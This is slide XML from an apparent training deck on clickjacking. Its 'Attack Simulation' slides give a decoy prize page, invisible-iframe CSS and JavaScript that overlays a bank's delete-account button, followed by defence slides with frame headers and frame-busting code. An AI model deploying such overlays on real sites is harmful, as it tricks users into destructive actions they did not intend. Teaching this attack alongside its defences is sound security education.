        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="650450" y="243979"/>
            <a:ext cx="10048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Clickjacking / UI Redressing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171365-8AB2-4195-8670-EAC786BE5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278562"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1404594" y="1620632"/>
          <a:ext cx="9417379" cy="3611245"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3375151">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2879641867"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4224839">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="195295956"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1817389">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="684270915"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="722249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Vector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Technique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Difficulty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833679"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="722249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Transparent Overlay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opacity: 0.01 on iframe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🟢 Easy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404681"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="722249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Cursor Tracking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iframe positioning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🟡 Medium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112593"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="722249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Multi-Layer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overlapping elements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🟠 Hard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697662"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="722249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Invisible Buttons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pointer-events manipulation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🟢 Easy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0368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86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6945F-DF36-466F-85A9-72C888713D63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Attack Simulation Step by Step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B8FF8C-307D-4717-81AC-8EACD8304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802" y="999912"/>
            <a:ext cx="2970237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Step 1: Reconnaissance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Arial Unicode MS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EFDB3-DB13-476C-8435-72ECAF42BFB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="869624" y="1490008"/>
            <a:ext cx="6473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# Check if target site allows framing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curl -I https://bank.com/delete-account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# Look for missing headers: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# X-Frame-Options: DENY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# Content-Security-Policy: frame-ancestors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6385DBB-7604-44D6-ADD8-D3360F7CF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802" y="376656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Identify Target Action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83A42"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="-apple-system"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49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C4169-3BDF-48FD-A3AD-3B2F470D6DF5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1312682" y="4272992"/>
            <a:ext cx="67283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Target: bank.com/account/delete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Button coordinates: (570, 200) to (820, 280)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Button text: "DELETE ACCOUNT"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Confirmation required: Yes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="658745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6945F-DF36-466F-85A9-72C888713D63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Attack Simulation Step by Step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30E02-F4C1-42C7-877F-89B8DA518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693" y="1005468"/>
            <a:ext cx="7213128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Step 3: Create Decoy Page / Save as with html extension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D1D1F"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Arial Unicode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A2FC0-A234-42F2-8C3C-8BC6C1CAC236}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1246697" y="1734252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&lt;div class="prize-container"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;h1&gt;🎮 FREE GAMING CREDITS! 🎮&lt;/h1&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;button class="claim-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>btn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"&gt;CLAIM $1000 NOW!&lt;/button&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/div&gt;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FDF3CFC-09EA-485B-A0E5-EC2C3976D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68" y="3109367"/>
            <a:ext cx="7591117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D1D1F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="system-ui"/>
              </a:rPr>
              <a:t>Step 4: Overlay Invisible Iframe / Save as with CSS extension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1D1D1F"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Arial Unicode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28B61-D4BB-4911-BF7A-136934983D90}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2104535" y="3478699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.hidden-frame {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    position: absolute;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    top: 50%;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    left: 50%;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    transform: translate(-50%, -50%);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    width: 400px;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    height: 300px;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    opacity: 0.01;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    z-index: 9999;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    pointer-events: auto;}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1125742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6945F-DF36-466F-85A9-72C888713D63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Attack Simulation Step by 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F700F-1250-43B3-9827-998D4EBE607E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1331536" y="89941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5: Precise Positioning / Save as with JavaScript Extension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FE9ED-CED2-4B40-9AED-01178B6BDF10}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1595487" y="1391075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const </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>visibleBtn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.querySelector</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>('.claim-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>btn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>const </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>visibleBtn.getBoundingClientRect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iframe.style.position</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = 'absolute';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>iframe.style.left</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rect.left</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> + 'px';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>iframe.style.top</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rect.top</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> + 'px';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>iframe.style.width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rect.width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> + 'px';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>iframe.style.height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rect.height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> + 'px';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96527-6E09-4917-AE6D-7F00EC9A90D3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1331536" y="382172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6: Execute Attack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4377D2-1522-4199-B29B-DDECE20F459A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1595487" y="4313387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visits attacker's gaming site</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>→ Sees attractive "Claim Prize" button</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>→ Clicks button (thinks they're claiming prize)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>→ Actually clicks "Delete Account" on bank.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>→ Account deleted without user knowledge</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>→ Redirected to legitimate site (covers tracks)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1962044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F37211-76C6-4B20-B0BA-998121455665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 Strategies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5183B5-62D9-4D8C-B34E-2388F7B1E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547906"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1187777" y="1514671"/>
          <a:ext cx="10218655" cy="3566375"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3504239">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3193965003"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4533457">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="92932306"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2180959">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1128985502"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="713275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Strategy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Effectiveness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571604"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="713275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X-Frame-Options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`X-Frame-Options: DENY`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🔴 Critical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537743"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="713275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CSP frame-ancestors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`frame-ancestors 'self'`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🔴 Critical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488397"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="713275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Frame-busting JS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</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2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window.top.location</a:t>
                      </a:r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` check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🟠 High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317836"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="713275"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 Confirmation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Multi-step confirmation dialogs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🟠 High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80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89DAB-C7C0-4BDC-80A5-38DB889430C4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94DDD-2C80-4749-8445-2FBC73B4EFD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="813062" y="84285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Layer 1: HTTP Headers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8909C3-893E-4B8C-92FF-5CAF3911A596}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1114721" y="1212187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@app.after_request</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>security_headers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(response):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>response.headers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>['X-Frame-Options'] = 'DENY'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>response.headers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>['Content-Security-Policy'] = "frame-ancestors 'self'"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>response.headers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>['X-Content-Type-Options'] = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nosniff</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    return response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1459B-C9C0-418A-A763-3160F89B7DF7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6813223" y="56750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Layer 2: Client-Side JavaScript / Save with JS extension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6D1E1C-63E6-4276-892B-1A9715F288DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7346622" y="936832"/>
            <a:ext cx="44934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(function() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    'use strict';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>window.top</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t> !== </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>window.self</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        try {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window.top.location</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>window.self.location</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        } catch (e) {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showFrameWarning</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>();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}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>showFrameWarning</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        const overlay = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>document.createElement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>('div');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overlay.style.cssText</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t> = `</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            position: fixed;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            top: 0; left: 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            width: 100%; height: 100%;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            background: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>rgba</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>(211, 47, 47, 0.95);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            color: white;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            display: flex;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            justify-content: center;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            align-items: center;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            z-index: 999999;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        `;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overlay.innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t> = `</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            &lt;div&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                &lt;h1&gt;⚠️ Security Alert&lt;/h1&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                &lt;p&gt;This page cannot be displayed in a frame.&lt;/p&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                &lt;button onclick="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>window.open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>window.location.href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>, '_blank')"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                    Open in New Window</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>                &lt;/button&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            &lt;/div&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        `;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>document.body.appendChild</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>(overlay);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>setInterval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>(() =&gt; {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>window.self</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t> !== </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>window.top</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>showFrameWarning</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    }, 1000);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>})();</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2085863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89DAB-C7C0-4BDC-80A5-38DB889430C4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 Strategies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3F6E5-9F3D-4518-9A05-F9734A20D674}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133574" y="84285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Layer 3: CSS Defense / Save as with CSS extension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5C870-7800-4F51-90A3-AA188157C4D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2996939" y="1409026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body.framed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-detected {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    pointer-events: none !important;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body.framed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-detected::before {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    content: "⚠️ Security Error: Framing not allowed";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    position: fixed;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    top: 0; left: 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    width: 100vw; height: 100vh;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    background: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rgba</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(0, 0, 0, 0.95);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    color: white;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    display: flex;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    justify-content: center;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    align-items: center;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    z-index: 999999;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397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89DAB-C7C0-4BDC-80A5-38DB889430C4}"/>
